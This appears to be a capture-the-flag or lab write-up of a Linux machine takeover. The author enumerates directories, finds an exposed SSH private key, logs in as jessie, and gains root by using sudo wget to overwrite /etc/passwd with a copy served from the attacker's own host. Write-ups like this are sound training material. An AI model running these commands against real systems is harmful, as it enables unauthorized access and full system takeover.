Enumeration

Port 80: HTTP


The default Apache webpage is displayed for this application. However, the source-code of this page contains the HTML comment above. This username jessie is interesting.


Doing a basic directory search shows the interesting entries above. The entry /sitemap stands out.


Browsing to the /sitemap displays the webpage above. I did not find anything useful.


Doing a directory search with the command feroxbuster -u http://10.10.65.71/sitemap/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt against this /sitemap directory shows /.ssh is available, as shown above.


And the SSH key is there located at http://10.10.65.71/sitemap/.ssh/id_rsa. But which user does this key belong to? The usernames davemiller and unapp show up numerous times. Or maybe I can use it against the user jessie.

Exploitation


I saved the SSH key to my machine and changed the permission to 400. Using the command ssh jessie@10.10.65.71 -i id_rsa, I gained access to the target machine as the user jessie.

Privilege Escalation


This user can execute the binary wget with sudo. This binary can be used to transfer files. I can transfer the /etc/passwd file to my machine, add a new root user in the file, and transfer it back to the target machine to escalate privileges to root.


I copied the content of /etc/passwd to my machine. Then I added a user new root user called super with the password rooted. On my machine, I started a Python HTTP server to serve this new passwd file with the new user to the target machine. Using the command sudo /usr/bin/wget -O passwd http://10.14.55.153/passwd, I overwrote the /etc/passwd file at the target machine.


In the picture above, the new user can be seen. Then I switched to this new user to gain a root shell. Now I have root access.
